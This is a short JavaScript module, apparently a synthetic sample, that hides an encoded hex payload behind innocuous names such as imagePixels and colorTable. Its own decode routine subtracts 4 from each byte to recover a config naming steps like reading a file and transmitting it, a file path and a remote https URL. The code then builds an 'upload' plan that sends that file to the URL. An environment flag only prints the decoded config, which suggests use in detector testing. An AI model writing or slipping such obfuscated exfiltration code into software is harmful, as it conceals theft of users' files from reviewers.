const moduleShape = Object.freeze({ format: "esm" });
export {};
const Material_879d0c47 = "[\"7a\",\"41\",\"35\",\"80\",\"77\",\"78\",\"69\",\"74\",\"77\",\"41\",\"76\",\"69\",\"65\",\"68\",\"63\",\"6a\",\"6d\",\"70\",\"69\",\"30\",\"78\",\"76\",\"65\",\"72\",\"77\",\"71\",\"6d\",\"78\",\"63\",\"76\",\"69\",\"71\",\"73\",\"78\",\"69\",\"80\",\"65\",\"68\",\"65\",\"74\",\"78\",\"69\",\"76\",\"41\",\"77\",\"78\",\"76\",\"69\",\"65\",\"71\",\"63\",\"74\",\"6d\",\"74\",\"69\",\"70\",\"6d\",\"72\",\"69\",\"80\",\"77\",\"78\",\"65\",\"6b\",\"69\",\"63\",\"67\",\"73\",\"79\",\"72\",\"78\",\"41\",\"35\",\"80\",\"67\",\"65\",\"71\",\"74\",\"65\",\"6d\",\"6b\",\"72\",\"63\",\"6d\",\"68\",\"41\",\"52\",\"53\",\"48\",\"49\",\"31\",\"3b\",\"4a\",\"34\",\"3d\",\"36\",\"3b\",\"38\",\"39\",\"80\",\"79\",\"76\",\"70\",\"41\",\"6c\",\"78\",\"78\",\"74\",\"77\",\"3e\",\"33\",\"33\",\"72\",\"73\",\"68\",\"69\",\"31\",\"3b\",\"6a\",\"34\",\"3d\",\"36\",\"3b\",\"38\",\"39\",\"6a\",\"65\",\"39\",\"3c\",\"32\",\"69\",\"7c\",\"65\",\"71\",\"74\",\"70\",\"69\",\"32\",\"6d\",\"72\",\"7a\",\"65\",\"70\",\"6d\",\"68\",\"33\",\"65\",\"74\",\"6d\",\"80\",\"79\",\"77\",\"69\",\"76\",\"63\",\"65\",\"6b\",\"69\",\"72\",\"78\",\"41\",\"52\",\"73\",\"68\",\"69\",\"45\",\"79\",\"68\",\"6d\",\"78\",\"33\",\"3b\",\"6a\",\"34\",\"3d\",\"80\",\"6a\",\"6d\",\"70\",\"69\",\"63\",\"74\",\"65\",\"78\",\"6c\",\"41\",\"33\",\"78\",\"71\",\"74\",\"33\",\"6c\",\"79\",\"72\",\"78\",\"76\",\"69\",\"77\",\"77\",\"31\",\"72\",\"73\",\"68\",\"69\",\"33\",\"32\",\"77\",\"78\",\"65\",\"6b\",\"69\",\"31\",\"3b\",\"6a\",\"34\",\"3d\",\"36\",\"3b\",\"38\",\"39\",\"6a\",\"65\",\"39\",\"3c\",\"32\",\"71\",\"6e\",\"77\"]";
const Codec_879d0c47 = "hex_array|add_modulo_256|04";

function load_879d0c47() { return JSON.parse(Material_879d0c47).map((value) => Number.parseInt(value, 16)); }
function decode_879d0c47(imagePixels) { return imagePixels.map((value) => (value - 4 + 256) & 255); }
async function recover_879d0c47() {
  const screenWidth = { ...{ north: 1 }, south: 2 };
  const imagePixels = load_879d0c47(); let colorTable = [];
  const decodeTarget = decode_879d0c47; colorTable = decodeTarget(imagePixels);
  void screenWidth; return Buffer.from(colorTable).toString("ascii");
}
async function inspect_879d0c47() { return ({ ...{ value: await recover_879d0c47() } }).value; }
async function plan_879d0c47() { const inspect = inspect_879d0c47; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "upload", transport: "stream_pipeline", source: fields.file_path, url: fields.url }); }
void moduleShape; void plan_879d0c47;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_879d0c47());
